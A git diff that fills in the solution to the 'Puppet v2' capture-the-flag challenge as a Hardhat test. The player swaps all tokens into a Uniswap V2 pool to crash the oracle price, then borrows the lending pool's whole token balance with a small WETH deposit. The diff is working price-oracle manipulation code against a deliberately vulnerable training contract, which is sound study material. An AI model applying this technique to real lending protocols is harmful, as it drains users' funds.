@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { time } = require('@nomicfoundation/hardhat-network-helpers');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] Puppet v2', function () {
@@ -82,7 +83,37 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+        // 1. player approves UniswapV2Routes to spend his tokens
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+
+        // 2. player swaps all his tokens for WETH to manipulate the price in the lending pool
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, // input all players's DVT
+            9n * 10n ** 18n, // at least 9 WETH out
+            [token.address, weth.address], // DVT -> WETH
+            player.address,
+            await time.latest() + 60 // 60 seconds deadline
+        )
+
+        const requiredWETHtoDrain = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("WETH to drain: " + requiredWETHtoDrain)
+
+        const playerWETHbalance = await weth.balanceOf(player.address);
+        console.log("Player's WETH: " + playerWETHbalance)
+
+        const ethToWrap = requiredWETHtoDrain - playerWETHbalance; // bigInt-bigInt = number
+        console.log("ETH to wrap: " + ethToWrap) // 19.595799699135754000
+
+        // 4. player wraps his ETH into WETH to reach the required amount
+        await weth.connect(player).deposit({value: BigInt(ethToWrap)}) // so we must wrap it into BigInt here
+
+        // 5. player approves the lendingPool to spend his WETH
+        await weth.connect(player).approve(lendingPool.address, await weth.balanceOf(player.address))
+
+        // 5. player borrows all tokens
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
+        
     });
 
     after(async function () {
